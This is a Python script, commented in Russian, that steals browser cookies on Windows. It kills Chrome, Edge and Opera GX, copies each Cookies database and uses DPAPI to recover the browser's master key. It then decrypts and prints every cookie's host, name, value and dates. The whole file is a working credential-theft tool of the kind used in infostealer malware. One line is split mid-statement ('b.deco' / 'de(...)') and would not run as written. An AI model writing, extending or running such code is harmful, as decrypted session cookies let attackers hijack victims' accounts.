import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import psutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES

BROWSER_PATHS = {
	'chrome': {
		'local_state': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
									"Local State"),
		'db_path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
								"Default", "Network", "Cookies"),
		'process_name': 'chrome.exe'
	},
	'edge': {
		'local_state': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
									"Local State"),
		'db_path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
								"Default", "Network", "Cookies"),
		'process_name': 'msedge.exe'
	},
	'opera_gx': {
		'local_state': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software",
									"Opera GX Stable", "Local State"),
		'db_path': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable",
								"Network", "Cookies"),
		'process_name': 'opera.exe'
	}
}


def get_chrome_datetime(chromedate):
	if chromedate != 86400000000 and chromedate:
		try:
			return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
		except Exception as e:
			print(f"Ошибка: {e}, chromedate: {chromedate}")
	return ""


def get_encryption_key(browser):
	if browser == "chrome":
		local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
										"Local State")
	elif browser == "edge":
		local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
										"Local State")
	elif browser == "operagx":
		local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software",
										"Opera GX Stable", "Local State")
	else:
		raise ValueError("Unsupported browser")

	with open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)
		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		key = key[5:]
		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data, key):
	try:
		iv = data[3:15]
		data = data[15:]
		cipher = AES.new(key, AES.MODE_GCM, iv)
		return cipher.decrypt(data)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
		except:
			return ""

def closeProcess(process_name):
	for proc in psutil.process_iter(['pid', 'name']):
		try:
			# Проверяем имя процесса
			if proc.info['name'] == process_name:
				proc.terminate()  # Останавливаем процесс
				print(f"Процесс {process_name} (PID {proc.info['pid']}) завершен.")
		except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
			pass


def process_browser():
	result = ""
	browsers = ["chrome", "edge", "operagx"]

	for browser in browsers:
		result += f"\nCookies from {browser.capitalize()}:\n"

		key = get_encryption_key(browser)

		if browser == "chrome":
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
								"Default", "Network", "Cookies")
			process_name = "chrome.exe"

		elif browser == "edge":
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
								"Default", "Network", "Cookies")
			process_name = "msedge.exe"

		elif browser == "operagx":
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable",
								"Network", "Cookies")
			process_name = "opera.exe"

		else:
			raise ValueError("Unsupported browser")

		filename = f"{browser}_Cookies.db"

		if not os.path.isfile(db_path):
			result += f"Файл базы данных для {browser} не найден."
		else:
			closeProcess(process_name)

			if not os.path.isfile(filename):
				shutil.copyfile(db_path, filename)

			try:
				db = sqlite3.connect(filename)
				db.text_factory = lambda b: b.deco
				de(errors="ignore")
				cursor = db.cursor()
				cursor.execute("""
				SELECT host_key, name, value, creation_utc, last_access_utc,
				expires_utc, encrypted_value FROM cookies""")

				for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
					decrypted_value = value if value else decrypt_data(encrypted_value, key)
					result += f"""
						Браузер: {browser}
						Хост: {host_key}
						Имя файла cookie: {name}
						Значение файла cookie (расшифровано): {decrypted_value}
						Дата создания (UTC): {get_chrome_datetime(creation_utc)}
						Дата последнего доступа (UTC): {get_chrome_datetime(last_access_utc)}
						Дата истечения срока (UTC): {get_chrome_datetime(expires_utc)}
					"""


				db.commit()
				db.close()

			except Exception as e:
				result += f"Ошибка в браузере {browser}: {e}"

			try:
				os.remove(filename)
			except Exception as e:
				result += f"Ошибка в удаления скопированной бд в браузере {browser}: {e}"
				pass

	return result



if __name__ == "__main__":
	print(process_browser())